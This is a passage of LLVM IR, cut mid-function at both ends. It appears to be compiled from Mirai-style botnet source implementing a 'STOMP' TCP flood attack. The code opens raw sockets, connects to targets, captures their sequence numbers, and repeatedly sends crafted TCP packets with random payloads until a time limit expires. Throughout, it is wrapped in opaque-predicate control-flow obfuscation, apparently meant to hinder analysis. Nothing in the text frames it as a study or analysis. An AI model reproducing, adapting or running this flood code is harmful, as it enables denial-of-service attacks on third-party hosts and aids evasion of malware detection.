  %591 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %590, i32 0, i32 4
  %592 = load i16, i16* %591, align 4
  %593 = and i16 %589, 1
  %594 = shl i16 %593, 13
  %595 = and i16 %592, -8193
  %596 = or i16 %595, %594
  store i16 %596, i16* %591, align 4
  %597 = load i8, i8* %29, align 1
  %598 = sext i8 %597 to i16
  %599 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %600 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %599, i32 0, i32 4
  %601 = load i16, i16* %600, align 4
  %602 = and i16 %598, 1
  %603 = shl i16 %602, 12
  %604 = and i16 %601, -4097
  %605 = or i16 %604, %603
  store i16 %605, i16* %600, align 4
  %606 = load i8, i8* %30, align 1
  %607 = sext i8 %606 to i16
  %608 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %609 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %608, i32 0, i32 4
  %610 = load i16, i16* %609, align 4
  %611 = and i16 %607, 1
  %612 = shl i16 %611, 11
  %613 = and i16 %610, -2049
  %614 = or i16 %613, %612
  store i16 %614, i16* %609, align 4
  %615 = load i8, i8* %31, align 1
  %616 = sext i8 %615 to i16
  %617 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %618 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %617, i32 0, i32 4
  %619 = load i16, i16* %618, align 4
  %620 = and i16 %616, 1
  %621 = shl i16 %620, 10
  %622 = and i16 %619, -1025
  %623 = or i16 %622, %621
  store i16 %623, i16* %618, align 4
  %624 = load i8, i8* %32, align 1
  %625 = sext i8 %624 to i16
  %626 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %627 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %626, i32 0, i32 4
  %628 = load i16, i16* %627, align 4
  %629 = and i16 %625, 1
  %630 = shl i16 %629, 9
  %631 = and i16 %628, -513
  %632 = or i16 %631, %630
  store i16 %632, i16* %627, align 4
  %633 = load i8, i8* %33, align 1
  %634 = sext i8 %633 to i16
  %635 = load %struct.tcphdr*, %struct.tcphdr** %48, align 8
  %636 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %635, i32 0, i32 4
  %637 = load i16, i16* %636, align 4
  %638 = and i16 %634, 1
  %639 = shl i16 %638, 8
  %640 = and i16 %637, -257
  %641 = or i16 %640, %639
  store i16 %641, i16* %636, align 4
  %642 = load i8*, i8** %49, align 8
  %643 = load i32, i32* %34, align 4
  call void @rand_alphastr(i8* %642, i32 %643)
  %644 = load i8*, i8** %49, align 8
  %645 = load i32, i32* %34, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds i8, i8* %644, i64 %646
  store i8 0, i8* %647, align 1
  br label %727

; <label>:648:                                    ; preds = %419, %411
  %649 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %650 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %649, i32 0, i32 4
  %651 = load i16, i16* %650, align 4
  %652 = lshr i16 %651, 8
  %653 = and i16 %652, 1
  %654 = zext i16 %653 to i32
  %655 = icmp ne i32 %654, 0
  br i1 %655, label %664, label %656

; <label>:656:                                    ; preds = %648
  %657 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %658 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %657, i32 0, i32 4
  %659 = load i16, i16* %658, align 4
  %660 = lshr i16 %659, 10
  %661 = and i16 %660, 1
  %662 = zext i16 %661 to i32
  %663 = icmp ne i32 %662, 0
  br i1 %663, label %664, label %683

; <label>:664:                                    ; preds = %656, %648
  %665 = load i32, i32* @x.27
  %666 = load i32, i32* @y.28
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %664
  %673 = load i32, i32* %37, align 4
  %674 = call i32 @close(i32 %673)
  %675 = load i32, i32* @x.27
  %676 = load i32, i32* @y.28
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %209

; <label>:683:                                    ; preds = %656
  br label %684

; <label>:684:                                    ; preds = %683
  %685 = load i32, i32* @x.27
  %686 = load i32, i32* @y.28
  %687 = sub i32 %685, 1
  %688 = mul i32 %685, %687
  %689 = urem i32 %688, 2
  %690 = icmp eq i32 %689, 0
  %691 = icmp slt i32 %686, 10
  %692 = or i1 %690, %691
  br i1 %692, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %684
  %693 = load i32, i32* @x.27
  %694 = load i32, i32* @y.28
  %695 = sub i32 %693, 1
  %696 = mul i32 %693, %695
  %697 = urem i32 %696, 2
  %698 = icmp eq i32 %697, 0
  %699 = icmp slt i32 %694, 10
  %700 = or i1 %698, %699
  br i1 %700, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %701

; <label>:701:                                    ; preds = %originalBBpart253, %originalBBpart245
  br label %702

; <label>:702:                                    ; preds = %701, %originalBBpart241, %355
  %703 = call i64 @time(i64* null) #6
  %704 = load i64, i64* %42, align 8
  %705 = sub nsw i64 %703, %704
  %706 = icmp sgt i64 %705, 10
  br i1 %706, label %707, label %726

; <label>:707:                                    ; preds = %702
  %708 = load i32, i32* @x.27
  %709 = load i32, i32* @y.28
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %707
  %716 = load i32, i32* %37, align 4
  %717 = call i32 @close(i32 %716)
  %718 = load i32, i32* @x.27
  %719 = load i32, i32* @y.28
  %720 = sub i32 %718, 1
  %721 = mul i32 %718, %720
  %722 = urem i32 %721, 2
  %723 = icmp eq i32 %722, 0
  %724 = icmp slt i32 %719, 10
  %725 = or i1 %723, %724
  br i1 %725, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %209

; <label>:726:                                    ; preds = %702
  br label %327

; <label>:727:                                    ; preds = %522
  br label %728

; <label>:728:                                    ; preds = %727, %originalBBpart225
  %729 = load i32, i32* %19, align 4
  %730 = add nsw i32 %729, 1
  store i32 %730, i32* %19, align 4
  br label %203

; <label>:731:                                    ; preds = %203
  br label %732

; <label>:732:                                    ; preds = %916, %731
  store i32 0, i32* %19, align 4
  br label %733

; <label>:733:                                    ; preds = %originalBBpart286, %732
  %734 = load i32, i32* @x.27
  %735 = load i32, i32* @y.28
  %736 = sub i32 %734, 1
  %737 = mul i32 %734, %736
  %738 = urem i32 %737, 2
  %739 = icmp eq i32 %738, 0
  %740 = icmp slt i32 %735, 10
  %741 = or i1 %739, %740
  br i1 %741, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %733
  %742 = load i32, i32* %19, align 4
  %743 = load i8, i8* %15, align 1
  %744 = zext i8 %743 to i32
  %745 = icmp slt i32 %742, %744
  %746 = load i32, i32* @x.27
  %747 = load i32, i32* @y.28
  %748 = sub i32 %746, 1
  %749 = mul i32 %746, %748
  %750 = urem i32 %749, 2
  %751 = icmp eq i32 %750, 0
  %752 = icmp slt i32 %747, 10
  %753 = or i1 %751, %752
  br i1 %753, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %745, label %754, label %910

; <label>:754:                                    ; preds = %originalBBpart261
  %755 = load i32, i32* @x.27
  %756 = load i32, i32* @y.28
  %757 = sub i32 %755, 1
  %758 = mul i32 %755, %757
  %759 = urem i32 %758, 2
  %760 = icmp eq i32 %759, 0
  %761 = icmp slt i32 %756, 10
  %762 = or i1 %760, %761
  br i1 %762, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %754
  %763 = load i8**, i8*** %22, align 8
  %764 = load i32, i32* %19, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds i8*, i8** %763, i64 %765
  %767 = load i8*, i8** %766, align 8
  store i8* %767, i8** %50, align 8
  %768 = load i8*, i8** %50, align 8
  %769 = bitcast i8* %768 to %struct.iphdr*
  store %struct.iphdr* %769, %struct.iphdr** %51, align 8
  %770 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %771 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %770, i64 1
  %772 = bitcast %struct.iphdr* %771 to %struct.tcphdr*
  store %struct.tcphdr* %772, %struct.tcphdr** %52, align 8
  %773 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %774 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %773, i64 1
  %775 = bitcast %struct.tcphdr* %774 to i8*
  store i8* %775, i8** %53, align 8
  %776 = load i16, i16* %24, align 2
  %777 = zext i16 %776 to i32
  %778 = icmp eq i32 %777, 65535
  %779 = load i32, i32* @x.27
  %780 = load i32, i32* @y.28
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br i1 %778, label %787, label %793

; <label>:787:                                    ; preds = %originalBBpart265
  %788 = call i32 @rand_next()
  %789 = and i32 %788, 65535
  %790 = trunc i32 %789 to i16
  %791 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %792 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %791, i32 0, i32 3
  store i16 %790, i16* %792, align 4
  br label %793

; <label>:793:                                    ; preds = %787, %originalBBpart265
  %794 = load i8, i8* %35, align 1
  %795 = icmp ne i8 %794, 0
  br i1 %795, label %796, label %819

; <label>:796:                                    ; preds = %793
  %797 = load i32, i32* @x.27
  %798 = load i32, i32* @y.28
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %796
  %805 = load i8*, i8** %53, align 8
  %806 = load i32, i32* %34, align 4
  call void @rand_alphastr(i8* %805, i32 %806)
  %807 = load i8*, i8** %53, align 8
  %808 = load i32, i32* %34, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds i8, i8* %807, i64 %809
  store i8 0, i8* %810, align 1
  %811 = load i32, i32* @x.27
  %812 = load i32, i32* @y.28
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %819

; <label>:819:                                    ; preds = %originalBBpart269, %793
  %820 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %821 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %820, i32 0, i32 7
  store i16 0, i16* %821, align 2
  %822 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %823 = bitcast %struct.iphdr* %822 to i16*
  %824 = call zeroext i16 @checksum_generic(i16* %823, i32 20)
  %825 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %826 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %825, i32 0, i32 7
  store i16 %824, i16* %826, align 2
  %827 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %828 = load i32, i32* %19, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %827, i64 %829
  %831 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %830, i32 0, i32 1
  %832 = load i32, i32* %831, align 4
  %833 = add i32 %832, 1
  store i32 %833, i32* %831, align 4
  %834 = trunc i32 %832 to i16
  %835 = call zeroext i16 @htons(i16 zeroext %834) #7
  %836 = zext i16 %835 to i32
  %837 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %838 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %837, i32 0, i32 2
  store i32 %836, i32* %838, align 4
  %839 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %21, align 8
  %840 = load i32, i32* %19, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %839, i64 %841
  %843 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %842, i32 0, i32 2
  %844 = load i32, i32* %843, align 4
  %845 = trunc i32 %844 to i16
  %846 = call zeroext i16 @htons(i16 zeroext %845) #7
  %847 = zext i16 %846 to i32
  %848 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %849 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %848, i32 0, i32 3
  store i32 %847, i32* %849, align 4
  %850 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %851 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %850, i32 0, i32 6
  store i16 0, i16* %851, align 4
  %852 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %853 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %854 = bitcast %struct.tcphdr* %853 to i8*
  %855 = load i32, i32* %34, align 4
  %856 = sext i32 %855 to i64
  %857 = add i64 20, %856
  %858 = trunc i64 %857 to i16
  %859 = call zeroext i16 @htons(i16 zeroext %858) #7
  %860 = load i32, i32* %34, align 4
  %861 = sext i32 %860 to i64
  %862 = add i64 20, %861
  %863 = trunc i64 %862 to i32
  %864 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %852, i8* %854, i16 zeroext %859, i32 %863)
  %865 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %866 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %865, i32 0, i32 6
  store i16 %864, i16* %866, align 4
  %867 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %868 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %867, i32 0, i32 1
  %869 = load i16, i16* %868, align 2
  %870 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %871 = load i32, i32* %19, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %870, i64 %872
  %874 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %873, i32 0, i32 0
  %875 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %874, i32 0, i32 1
  store i16 %869, i16* %875, align 2
  %876 = load i32, i32* %20, align 4
  %877 = load i8*, i8** %50, align 8
  %878 = load i32, i32* %34, align 4
  %879 = sext i32 %878 to i64
  %880 = add i64 40, %879
  %881 = bitcast %union.__CONST_SOCKADDR_ARG* %54 to %struct.sockaddr**
  %882 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %883 = load i32, i32* %19, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %882, i64 %884
  %886 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %885, i32 0, i32 0
  %887 = bitcast %struct.sockaddr_in* %886 to %struct.sockaddr*
  store %struct.sockaddr* %887, %struct.sockaddr** %881, align 8
  %888 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %54, i32 0, i32 0
  %889 = load %struct.sockaddr*, %struct.sockaddr** %888, align 8
  %890 = call i64 @sendto(i32 %876, i8* %877, i64 %880, i32 16384, %struct.sockaddr* %889, i32 16)
  br label %891

; <label>:891:                                    ; preds = %819
  %892 = load i32, i32* @x.27
  %893 = load i32, i32* @y.28
  %894 = sub i32 %892, 1
  %895 = mul i32 %892, %894
  %896 = urem i32 %895, 2
  %897 = icmp eq i32 %896, 0
  %898 = icmp slt i32 %893, 10
  %899 = or i1 %897, %898
  br i1 %899, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %891
  %900 = load i32, i32* %19, align 4
  %901 = add nsw i32 %900, 1
  store i32 %901, i32* %19, align 4
  %902 = load i32, i32* @x.27
  %903 = load i32, i32* @y.28
  %904 = sub i32 %902, 1
  %905 = mul i32 %902, %904
  %906 = urem i32 %905, 2
  %907 = icmp eq i32 %906, 0
  %908 = icmp slt i32 %903, 10
  %909 = or i1 %907, %908
  br i1 %909, label %originalBBpart286, label %originalBB71alteredBB

originalBBpart286:                                ; preds = %originalBB71
  br label %733

; <label>:910:                                    ; preds = %originalBBpart261
  %911 = call i64 @time(i64* null) #6
  %912 = load i32, i32* %36, align 4
  %913 = sext i32 %912 to i64
  %914 = icmp sgt i64 %911, %913
  br i1 %914, label %915, label %916

; <label>:915:                                    ; preds = %910
  br label %917

; <label>:916:                                    ; preds = %910
  br label %732

; <label>:917:                                    ; preds = %915, %354, %originalBBpart213, %originalBBpart25
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %918 = alloca i32, align 4
  %919 = alloca i8, align 1
  %920 = alloca %struct.attack_target*, align 8
  %921 = alloca i8, align 1
  %922 = alloca %struct.attack_option*, align 8
  %923 = alloca i32, align 4
  %924 = alloca i32, align 4
  %925 = alloca %struct.attack_stomp_data*, align 8
  %926 = alloca i8**, align 8
  %927 = alloca i8, align 1
  %928 = alloca i16, align 2
  %929 = alloca i8, align 1
  %930 = alloca i8, align 1
  %931 = alloca i16, align 2
  %932 = alloca i8, align 1
  %933 = alloca i8, align 1
  %934 = alloca i8, align 1
  %935 = alloca i8, align 1
  %936 = alloca i8, align 1
  %937 = alloca i8, align 1
  %938 = alloca i32, align 4
  %939 = alloca i8, align 1
  %940 = alloca i32, align 4
  %941 = alloca i32, align 4
  %942 = alloca %struct.sockaddr_in, align 4
  %943 = alloca %struct.sockaddr_in, align 4
  %944 = alloca i32, align 4
  %945 = alloca [256 x i8], align 16
  %946 = alloca i64, align 8
  %947 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %948 = alloca i32, align 4
  %949 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %950 = alloca %struct.tcphdr*, align 8
  %951 = alloca %struct.iphdr*, align 8
  %952 = alloca %struct.tcphdr*, align 8
  %953 = alloca i8*, align 8
  %954 = alloca i8*, align 8
  %955 = alloca %struct.iphdr*, align 8
  %956 = alloca %struct.tcphdr*, align 8
  %957 = alloca i8*, align 8
  %958 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %918, align 4
  store i8 %1, i8* %919, align 1
  store %struct.attack_target* %2, %struct.attack_target** %920, align 8
  store i8 %3, i8* %921, align 1
  store %struct.attack_option* %4, %struct.attack_option** %922, align 8
  store i32 0, i32* %923, align 4
  store i32 0, i32* %924, align 4
  %959 = load i8, i8* %919, align 1
  %960 = zext i8 %959 to i64
  %961 = call noalias i8* @calloc(i64 %960, i64 16) #6
  %962 = bitcast i8* %961 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %962, %struct.attack_stomp_data** %925, align 8
  %963 = load i8, i8* %919, align 1
  %964 = zext i8 %963 to i64
  %965 = call noalias i8* @calloc(i64 %964, i64 8) #6
  %966 = bitcast i8* %965 to i8**
  store i8** %966, i8*** %926, align 8
  %967 = load i8, i8* %921, align 1
  %968 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %969 = call i32 @attack_get_opt_int(i8 zeroext %967, %struct.attack_option* %968, i8 zeroext 2, i32 0)
  %970 = trunc i32 %969 to i8
  store i8 %970, i8* %927, align 1
  %971 = load i8, i8* %921, align 1
  %972 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %973 = call i32 @attack_get_opt_int(i8 zeroext %971, %struct.attack_option* %972, i8 zeroext 3, i32 65535)
  %974 = trunc i32 %973 to i16
  store i16 %974, i16* %928, align 2
  %975 = load i8, i8* %921, align 1
  %976 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %977 = call i32 @attack_get_opt_int(i8 zeroext %975, %struct.attack_option* %976, i8 zeroext 4, i32 64)
  %978 = trunc i32 %977 to i8
  store i8 %978, i8* %929, align 1
  %979 = load i8, i8* %921, align 1
  %980 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %981 = call i32 @attack_get_opt_int(i8 zeroext %979, %struct.attack_option* %980, i8 zeroext 5, i32 1)
  %982 = trunc i32 %981 to i8
  store i8 %982, i8* %930, align 1
  %983 = load i8, i8* %921, align 1
  %984 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %985 = call i32 @attack_get_opt_int(i8 zeroext %983, %struct.attack_option* %984, i8 zeroext 7, i32 65535)
  %986 = trunc i32 %985 to i16
  store i16 %986, i16* %931, align 2
  %987 = load i8, i8* %921, align 1
  %988 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %989 = call i32 @attack_get_opt_int(i8 zeroext %987, %struct.attack_option* %988, i8 zeroext 10, i32 0)
  %990 = trunc i32 %989 to i8
  store i8 %990, i8* %932, align 1
  %991 = load i8, i8* %921, align 1
  %992 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %993 = call i32 @attack_get_opt_int(i8 zeroext %991, %struct.attack_option* %992, i8 zeroext 11, i32 1)
  %994 = trunc i32 %993 to i8
  store i8 %994, i8* %933, align 1
  %995 = load i8, i8* %921, align 1
  %996 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %997 = call i32 @attack_get_opt_int(i8 zeroext %995, %struct.attack_option* %996, i8 zeroext 12, i32 1)
  %998 = trunc i32 %997 to i8
  store i8 %998, i8* %934, align 1
  %999 = load i8, i8* %921, align 1
  %1000 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %1001 = call i32 @attack_get_opt_int(i8 zeroext %999, %struct.attack_option* %1000, i8 zeroext 13, i32 0)
  %1002 = trunc i32 %1001 to i8
  store i8 %1002, i8* %935, align 1
  %1003 = load i8, i8* %921, align 1
  %1004 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %1005 = call i32 @attack_get_opt_int(i8 zeroext %1003, %struct.attack_option* %1004, i8 zeroext 14, i32 0)
  %1006 = trunc i32 %1005 to i8
  store i8 %1006, i8* %936, align 1
  %1007 = load i8, i8* %921, align 1
  %1008 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %1009 = call i32 @attack_get_opt_int(i8 zeroext %1007, %struct.attack_option* %1008, i8 zeroext 15, i32 0)
  %1010 = trunc i32 %1009 to i8
  store i8 %1010, i8* %937, align 1
  %1011 = load i8, i8* %921, align 1
  %1012 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %1013 = call i32 @attack_get_opt_int(i8 zeroext %1011, %struct.attack_option* %1012, i8 zeroext 0, i32 768)
  store i32 %1013, i32* %938, align 4
  %1014 = load i8, i8* %921, align 1
  %1015 = load %struct.attack_option*, %struct.attack_option** %922, align 8
  %1016 = call i32 @attack_get_opt_int(i8 zeroext %1014, %struct.attack_option* %1015, i8 zeroext 1, i32 1)
  %1017 = trunc i32 %1016 to i8
  store i8 %1017, i8* %939, align 1
  %1018 = call i64 @time(i64* null) #6
  %1019 = load i32, i32* %918, align 4
  %1020 = sext i32 %1019 to i64
  %_ = sub i64 %1018, %1020
  %gen = mul i64 %_, %1020
  %_1 = sub i64 0, %1018
  %gen2 = add i64 %_1, %1020
  %1021 = add nsw i64 %1018, %1020
  %1022 = trunc i64 %1021 to i32
  store i32 %1022, i32* %940, align 4
  %1023 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %1023, i32* %924, align 4
  %1024 = icmp eq i32 %1023, -1
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %129
  br label %originalBB3

originalBB7alteredBB:                             ; preds = %originalBB7, %146
  store i32 1, i32* %19, align 4
  %1025 = load i32, i32* %20, align 4
  %1026 = bitcast i32* %19 to i8*
  %1027 = call i32 @setsockopt(i32 %1025, i32 0, i32 3, i8* %1026, i32 4) #6
  %1028 = icmp eq i32 %1027, -1
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %167
  %1029 = load i32, i32* %20, align 4
  %1030 = call i32 @close(i32 %1029)
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %186
  store i32 0, i32* %19, align 4
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %209
  %1031 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %1031, i32* %37, align 4
  %1032 = icmp eq i32 %1031, -1
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %228
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %245
  %1033 = load i32, i32* %37, align 4
  %1034 = load i32, i32* %37, align 4
  %1035 = call i32 (i32, i32, ...) @fcntl(i32 %1034, i32 3, i32 0)
  %_28 = sub i32 %1035, 2048
  %gen29 = mul i32 %_28, 2048
  %_30 = sub i32 %1035, 2048
  %gen31 = mul i32 %_30, 2048
  %1036 = or i32 %1035, 2048
  %1037 = call i32 (i32, i32, ...) @fcntl(i32 %1033, i32 4, i32 %1036)
  %1038 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 0
  store i16 2, i16* %1038, align 4
  %1039 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %1040 = load i32, i32* %19, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1039, i64 %1041
  %1043 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1042, i32 0, i32 2
  %1044 = load i8, i8* %1043, align 4
  %1045 = zext i8 %1044 to i32
  %1046 = icmp slt i32 %1045, 32
  br label %originalBB27

originalBB35alteredBB:                            ; preds = %originalBB35, %327
  store i32 0, i32* %44, align 4
  store i32 16, i32* %40, align 4
  %1047 = load i32, i32* %20, align 4
  %1048 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i32 0, i32 0
  %1049 = bitcast %union.__CONST_SOCKADDR_ARG* %45 to %struct.sockaddr**
  %1050 = bitcast %struct.sockaddr_in* %39 to %struct.sockaddr*
  store %struct.sockaddr* %1050, %struct.sockaddr** %1049, align 8
  %1051 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %45, i32 0, i32 0
  %1052 = load %struct.sockaddr*, %struct.sockaddr** %1051, align 8
  %1053 = call i64 @recvfrom(i32 %1047, i8* %1048, i64 256, i32 16384, %struct.sockaddr* %1052, i32* %40)
  %1054 = trunc i64 %1053 to i32
  store i32 %1054, i32* %44, align 4
  %1055 = load i32, i32* %44, align 4
  %1056 = icmp eq i32 %1055, -1
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %363
  %1057 = load i32, i32* %44, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = icmp ugt i64 %1058, 40
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %383
  %1060 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i32 0, i32 0
  %1061 = getelementptr inbounds i8, i8* %1060, i64 20
  %1062 = bitcast i8* %1061 to %struct.tcphdr*
  store %struct.tcphdr* %1062, %struct.tcphdr** %46, align 8
  %1063 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %1064 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1063, i32 0, i32 0
  %1065 = load i16, i16* %1064, align 4
  %1066 = zext i16 %1065 to i32
  %1067 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  %1068 = load i16, i16* %1067, align 2
  %1069 = zext i16 %1068 to i32
  %1070 = icmp eq i32 %1066, %1069
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %664
  %1071 = load i32, i32* %37, align 4
  %1072 = call i32 @close(i32 %1071)
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %684
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %707
  %1073 = load i32, i32* %37, align 4
  %1074 = call i32 @close(i32 %1073)
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %733
  %1075 = load i32, i32* %19, align 4
  %1076 = load i8, i8* %15, align 1
  %1077 = zext i8 %1076 to i32
  %1078 = icmp slt i32 %1075, %1077
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %754
  %1079 = load i8**, i8*** %22, align 8
  %1080 = load i32, i32* %19, align 4
  %1081 = sext i32 %1080 to i64
  %1082 = getelementptr inbounds i8*, i8** %1079, i64 %1081
  %1083 = load i8*, i8** %1082, align 8
  store i8* %1083, i8** %50, align 8
  %1084 = load i8*, i8** %50, align 8
  %1085 = bitcast i8* %1084 to %struct.iphdr*
  store %struct.iphdr* %1085, %struct.iphdr** %51, align 8
  %1086 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %1087 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1086, i64 1
  %1088 = bitcast %struct.iphdr* %1087 to %struct.tcphdr*
  store %struct.tcphdr* %1088, %struct.tcphdr** %52, align 8
  %1089 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
